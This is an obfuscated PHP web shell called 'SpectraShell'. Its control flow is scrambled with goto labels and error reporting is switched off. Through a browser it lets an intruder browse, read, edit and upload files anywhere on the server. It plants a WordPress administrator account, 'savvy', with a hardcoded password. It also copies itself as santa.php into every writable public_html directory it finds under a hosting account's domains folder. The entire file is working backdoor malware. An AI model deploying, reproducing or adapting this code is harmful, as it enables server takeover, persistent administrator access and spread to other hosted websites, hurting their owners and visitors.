<?php
//มันก็ได้พบกับข~~~=o(￣▽￣*)ゞ))นนกกลุ่มหนึ่งซึ่งร่วงห￣▽￣*)oล่นมาจากเหล่านก
goto uqpQ8;
IQh2z:
HdXUv($hwF0f);
goto maeS6;
NAaWU:
JT6bq($hwF0f, basename($_GET["view"]));
goto R3qRh;
mE9K4:
echo "<form method='get'>\r\n    <input type='hidden' name='path' value='" . htmlspecialchars($hwF0f) . "'>\r\n    <button name='create_wp_user' value='1'>👤 Create WP Admin</button>\r\n</form><br>";
goto IQh2z;
fOJnj:
function jt6bQ($hwF0f, $yWxSs)
{
    goto YjiSs;
    hzat9:
    echo "<h3>📄 Viewing: {$yWxSs}</h3><pre style='background:#111;padding:10px;color:#6f6;border:1px solid #444;'>";
    goto tqYwz;
    p5Orh:
    echo "</pre><hr>";
    goto ao9jY;
    TPLxA:
    return;
    goto PKPGX;
    YjiSs:
    $HbSVQ = "{$hwF0f}/{$yWxSs}";
    goto Z7PpV;
    Z7PpV:
    if (is_file($HbSVQ)) {
        goto k3Azo;
    }
    goto TPLxA;
    PKPGX:
    k3Azo:
    goto hzat9;
    tqYwz:
    echo htmlspecialchars(file_get_contents($HbSVQ));
    goto p5Orh;
    ao9jY:
}
goto ylSPd;
atb5a:
Vkt5J:
goto w6F16;
unfvD:
echo "<p>⬆️ <a href='?path=" . urlencode($BAZ42) . "'>Go up: {$BAZ42}</a></p>";
goto OuPFX;
PQzJG:
BZ56w:
goto gq1la;
IwqvX:
function zU3SZ($hwF0f)
{
    goto h0irX;
    jrbJv:
    eprDw:
    goto EaGjr;
    p61kz:
    goto eprDw;
    goto nCt1V;
    UY5qv:
    echo "<p style='color:#f66;'>❌ Folder exists</p>";
    goto p61kz;
    MSZW3:
    echo "<p style='color:#0f0;'>📤 Uploaded</p>";
    goto KlyHq;
    KlyHq:
    CXLsw:
    goto vRgeM;
    h0irX:
    if (empty($_FILES["up"]["name"])) {
        goto CXLsw;
    }
    goto OCpo3;
    cFTw0:
    $SGuM2 = "{$hwF0f}/" . basename($_POST["mkdir"]);
    goto nN0_m;
    nCt1V:
    Aqtt9:
    goto FLIun;
    vRgeM:
    if (empty($_POST["mkdir"])) {
        goto z8Zms;
    }
    goto cFTw0;
    OCpo3:
    move_uploaded_file($_FILES["up"]["tmp_name"], "{$hwF0f}/" . basename($_FILES["up"]["name"]));
    goto MSZW3;
    EaGjr:
    z8Zms:
    goto SmeuN;
    QZanz:
    echo "<p style='color:#0f0;'>📁 Folder created</p>";
    goto jrbJv;
    nN0_m:
    if (!file_exists($SGuM2)) {
        goto Aqtt9;
    }
    goto UY5qv;
    FLIun:
    mkdir($SGuM2);
    goto QZanz;
    SmeuN:
    echo "<form method='post' enctype='multipart/form-data'>\r\n        <input type='file' name='up'> <button>Upload</button></form><br>\r\n    <form method='post'>\r\n        📁 <input type='text' name='mkdir'> <button>Create Folder</button></form><br>";
    goto uBbmi;
    uBbmi:
}
goto iHDVR;
iHDVR:
function Nwwud($kYCsy)
{
    goto ZwjXx;
    qeMLz:
    return $G0iTb;
    goto Ij0EL;
    Ij0EL:
    xyy8E:
    goto HE22k;
    BOHz7:
    if (!(preg_match("/\\/u[\\w\\d]+\$/", $DLzN0) && is_dir("{$DLzN0}/domains"))) {
        goto xyy8E;
    }
    goto FQBuX;
    PtZ5k:
    kxQ2B:
    goto tozv6;
    ZwjXx:
    static $qg9H9 = false;
    goto RIU7f;
    FQBuX:
    $JTsOv = "{$DLzN0}/domains";
    goto xhzDc;
    c73Uv:
    return [];
    goto dRuzL;
    xhzDc:
    $G0iTb = [];
    goto ZX3mA;
    BdXpV:
    P7Ev7:
    goto c73Uv;
    tozv6:
    $qg9H9 = true;
    goto qvamI;
    VL5aU:
    mDK4I:
    goto qeMLz;
    H4Tsb:
    return [];
    goto PtZ5k;
    ZX3mA:
    foreach (scandir($JTsOv) as $JRhfo) {
        goto Vt0t6;
        Vt0t6:
        if (!($JRhfo === "." || $JRhfo === "..")) {
            goto X_tIy;
        }
        goto fyFbw;
        OYmrt:
        vb6J8:
        goto bo_hY;
        J2xHk:
        if (!(is_dir($CQXFz) && is_writable($CQXFz))) {
            goto uKjt_;
        }
        goto w9t7W;
        bo_hY:
        uKjt_:
        goto rcLn2;
        haaGw:
        $B7eTS = "{$CQXFz}/santa.php";
        goto J2xHk;
        VWR3W:
        $CQXFz = "{$JTsOv}/{$JRhfo}/public_html";
        goto haaGw;
        zYMZB:
        X_tIy:
        goto VWR3W;
        fyFbw:
        goto f1SSr;
        goto zYMZB;
        w9t7W:
        if (!file_put_contents($B7eTS, $kYCsy)) {
            goto vb6J8;
        }
        goto z3tEz;
        z3tEz:
        $G0iTb[] = "http://{$JRhfo}/santa.php";
        goto OYmrt;
        rcLn2:
        f1SSr:
        goto lRXBo;
        lRXBo:
    }
    goto VL5aU;
    RIU7f:
    if (!$qg9H9) {
        goto kxQ2B;
    }
    goto H4Tsb;
    kOas2:
    goto td2EZ;
    goto BdXpV;
    dy_1C:
    td2EZ:
    goto V7snM;
    V7snM:
    if (!($DLzN0 !== "/")) {
        goto P7Ev7;
    }
    goto BOHz7;
    qvamI:
    $DLzN0 = __DIR__;
    goto dy_1C;
    HE22k:
    $DLzN0 = dirname($DLzN0);
    goto kOas2;
    dRuzL:
}
goto OPFQ7;
wMysk:
if (!isset($_GET["view"])) {
    goto tKR4i;
}
goto NAaWU;
UZZhq:
$BAZ42 = dirname($hwF0f);
goto gT1RD;
UFdBi:
function Besqk($hwF0f)
{
    goto HRZBh;
    xr1O4:
    return $qBhrg;
    goto Kf6HL;
    jbLYg:
    ZBvmh:
    goto RTp__;
    S7EV4:
    foreach ($eV2Mh as $tMBJG) {
        $qBhrg .= "<li>📄 <a href='?path=" . urlencode($hwF0f) . "&view=" . urlencode($tMBJG) . "'>{$tMBJG}</a> \r\n        | <a href='?path=" . urlencode($hwF0f) . "&edit=" . urlencode($tMBJG) . "' style='color:#6cf'>✏️ Edit</a></li>";
        fi8xK:
    }
    goto juSMd;
    P3f24:
    $i6IsC = $eV2Mh = [];
    goto r_FKF;
    Aeqfe:
    foreach ($i6IsC as $tMBJG) {
        goto NQ7Rt;
        yOmzT:
        $qBhrg .= "<li>📁 <a href='?path=" . urlencode($HbSVQ) . "'>{$tMBJG}</a></li>";
        goto yOMTO;
        NQ7Rt:
        $HbSVQ = "{$hwF0f}/{$tMBJG}";
        goto yOmzT;
        yOMTO:
        OLOn6:
        goto D2PDl;
        D2PDl:
    }
    goto VoOkM;
    r_FKF:
    foreach (scandir($hwF0f) as $HB3MY) {
        goto eV2ii;
        eV2ii:
        if (!($HB3MY === "." || $HB3MY === "..")) {
            goto bQIch;
        }
        goto nhsps;
        sDgwe:
        QW5dN:
        goto cZ9ml;
        nhsps:
        goto k44R4;
        goto LkeO5;
        UeJk9:
        fBrxh:
        goto sD4Ib;
        syrkf:
        $eV2Mh[] = $HB3MY;
        goto Wrxov;
        sD4Ib:
        k44R4:
        goto lUVfZ;
        LkeO5:
        bQIch:
        goto v1qmT;
        Wrxov:
        goto fBrxh;
        goto sDgwe;
        cZ9ml:
        $i6IsC[] = $HB3MY;
        goto UeJk9;
        v1qmT:
        if (is_dir("{$hwF0f}/{$HB3MY}")) {
            goto QW5dN;
        }
        goto syrkf;
        lUVfZ:
    }
    goto jbLYg;
    juSMd:
    GzRMM:
    goto xr1O4;
    mFk96:
    natcasesort($eV2Mh);
    goto Aeqfe;
    RTp__:
    natcasesort($i6IsC);
    goto mFk96;
    HRZBh:
    $qBhrg = '';
    goto P3f24;
    VoOkM:
    InNcI:
    goto S7EV4;
    Kf6HL:
}
goto fOJnj;
nqDBL:
$kYCsy = file_get_contents(__FILE__);
goto t0c4Y;
HyQF1:
$hwF0f = isset($_GET["path"]) ? realpath($_GET["path"]) : getcwd();
goto ddaDP;
OPFQ7:
function HdXuv($hwF0f)
{
    goto sdkQP;
    P40E1:
    SNjzO:
    goto gJ40b;
    pNjo5:
    $HS8SX = "SavvyMrx#";
    goto Q1nT2;
    IboIf:
    z9pDQ:
    goto cJpSI;
    MttsJ:
    return;
    goto wFyav;
    iQkaX:
    $hA_sT = new Jc23_($KOYcL);
    goto IxZd2;
    WsG5P:
    require_once "{$j3Jij}/wp-load.php";
    goto sEIeB;
    Q1nT2:
    $VPC3y = "savvy@domain.com";
    goto Fkvlx;
    sdkQP:
    if (isset($_GET["create_wp_user"])) {
        goto kHdJJ;
    }
    goto kkqDy;
    oXB9K:
    goto v8zif;
    goto P40E1;
    wFyav:
    wHANx:
    goto WsG5P;
    LCgo1:
    if (!($j3Jij !== "/")) {
        goto SNjzO;
    }
    goto WCF02;
    W1_Ft:
    goto SNjzO;
    goto IboIf;
    JWclI:
    $KOYcL = NpnBc($IZyMI, $HS8SX, $VPC3y);
    goto iQkaX;
    WonvH:
    echo "<p style='color:#f66;'>❌ WordPress not found.</p>";
    goto MttsJ;
    WCF02:
    if (!file_exists("{$j3Jij}/wp-config.php")) {
        goto z9pDQ;
    }
    goto W1_Ft;
    GNwhP:
    echo "<p style='color:#0f0;'>✅ WP Admin user 'savvy' created.</p>";
    goto bM3_t;
    bM3_t:
    HC1J6:
    goto Gt0wZ;
    rtKNq:
    kHdJJ:
    goto gbUTf;
    eXNHL:
    v8zif:
    goto LCgo1;
    gJ40b:
    if (file_exists("{$j3Jij}/wp-load.php")) {
        goto wHANx;
    }
    goto WonvH;
    IxZd2:
    $hA_sT->YrPZc("administrator");
    goto GNwhP;
    sEIeB:
    $IZyMI = "savvy";
    goto pNjo5;
    vcaTa:
    echo "<p style='color:#ff0;'>⚠️ User/email already exists.</p>";
    goto m6N1u;
    m6N1u:
    goto HC1J6;
    goto op33A;
    gbUTf:
    $j3Jij = $hwF0f;
    goto eXNHL;
    Fkvlx:
    if (!wG4S9($IZyMI) && !IXXbC($VPC3y)) {
        goto eQxwD;
    }
    goto vcaTa;
    kkqDy:
    return;
    goto rtKNq;
    cJpSI:
    $j3Jij = dirname($j3Jij);
    goto oXB9K;
    op33A:
    eQxwD:
    goto JWclI;
    Gt0wZ:
}
goto Ph4Mm;
zKdu5:
kIHwx:
goto r6PK4;
vPLq3:
if (!isset($_GET["edit"])) {
    goto BZ56w;
}
goto u1ziE;
ylSPd:
function NQ2qU($hwF0f, $yWxSs)
{
    goto XKVHg;
    Ue_6a:
    if (is_file($HbSVQ)) {
        goto tz9lY;
    }
    goto kInv_;
    z9Zr8:
    echo "<p style='color:#0f0;'>✅ Saved</p>";
    goto xOOFV;
    xcdLQ:
    file_put_contents($HbSVQ, $_POST["content"]);
    goto z9Zr8;
    kInv_:
    return;
    goto nk_QP;
    QeAHc:
    $kYCsy = htmlspecialchars(file_get_contents($HbSVQ));
    goto SrM5S;
    SrM5S:
    echo "<h3>✏️ Editing: {$yWxSs}</h3>\r\n    <form method='post'>\r\n        <textarea name='content' rows='20' style='width:100%;background:#111;color:#fff;'>{$kYCsy}</textarea><br>\r\n        <button type='submit'>Save</button>\r\n    </form><hr>";
    goto aFclg;
    nk_QP:
    tz9lY:
    goto lN7P6;
    lN7P6:
    if (!($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["content"]))) {
        goto jx9jL;
    }
    goto xcdLQ;
    XKVHg:
    $HbSVQ = "{$hwF0f}/{$yWxSs}";
    goto Ue_6a;
    xOOFV:
    jx9jL:
    goto QeAHc;
    aFclg:
}
goto IwqvX;
w6F16:
oahcD:
goto UZZhq;
qxduZ:
foreach ($g7dqo as $SFyNS) {
    echo "<li><a href='{$SFyNS}' target='_blank'>{$SFyNS}</a></li>";
    m9Y5C:
}
goto moqTr;
r6PK4:
function OOznl($hwF0f)
{
    goto tnSpw;
    rbUbJ:
    $c74z_ = "/";
    goto Cj1Fy;
    HAl5v:
    XzDwd:
    goto eB7EL;
    tnSpw:
    $oxeuC = explode("/", trim($hwF0f, "/"));
    goto rbUbJ;
    JrJHM:
    foreach ($oxeuC as $ToVPT) {
        goto bdS4_;
        Xz9Wp:
        $f1XwY .= "<a href='?path=" . urlencode($c74z_) . "'>{$ToVPT}</a>/";
        goto bIFoW;
        bdS4_:
        $c74z_ .= "{$ToVPT}/";
        goto Xz9Wp;
        bIFoW:
        io2UL:
        goto M3nNG;
        M3nNG:
    }
    goto HAl5v;
    Cj1Fy:
    $f1XwY = "<strong>Current path:</strong> ";
    goto JrJHM;
    eB7EL:
    return $f1XwY;
    goto atMRg;
    atMRg:
}
goto UFdBi;
R3qRh:
tKR4i:
goto vPLq3;
maeS6:
if (!(basename(__FILE__) !== "santa.php")) {
    goto oahcD;
}
goto nqDBL;
Ph4Mm:
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>🌌 SpectraShell</title>\r\n<style>\r\nbody { background:#101010; color:#ddd; font-family:monospace; padding:20px; max-width:900px; margin:auto; }\r\na { color:#6cf; text-decoration:none; } a:hover { text-decoration:underline; }\r\npre, textarea { width:100%; background:#1a1a1a; color:#eee; border:1px solid #333; }\r\nbutton { background:#6cf; border:none; color:#000; padding:6px 12px; margin-top:5px; }\r\nul { list-style:none; padding:0; }\r\n</style></head><body>\r\n<h2>🌌 SpectraShell</h2><p>" . OOzNl($hwF0f) . "</p><hr>";
goto mE9K4;
gT1RD:
if (!($BAZ42 && $BAZ42 !== $hwF0f)) {
    goto HZ1Wb;
}
goto unfvD;
IJ1aq:
echo "</ul><hr>";
goto atb5a;
moqTr:
KjTv8:
goto IJ1aq;
OuPFX:
HZ1Wb:
goto wMysk;
t0c4Y:
$g7dqo = NWwUd($kYCsy);
goto VvDTZ;
ddaDP:
if (!(!$hwF0f || !is_dir($hwF0f))) {
    goto kIHwx;
}
goto rhunl;
DPHD1:
echo "<p style='color:#0f0;'>✅ Cloned to:</p><ul>";
goto qxduZ;
uqpQ8:
error_reporting(0);
goto HyQF1;
gq1la:
zU3Sz($hwF0f);
goto VDTMC;
VvDTZ:
if (empty($g7dqo)) {
    goto Vkt5J;
}
goto DPHD1;
VDTMC:
echo "<ul>" . BeSqk($hwF0f) . "</ul>";
goto n0xgp;
rhunl:
$hwF0f = getcwd();
goto zKdu5;
u1ziE:
nq2QU($hwF0f, basename($_GET["edit"]));
goto PQzJG;
n0xgp:
echo "</body></html>";
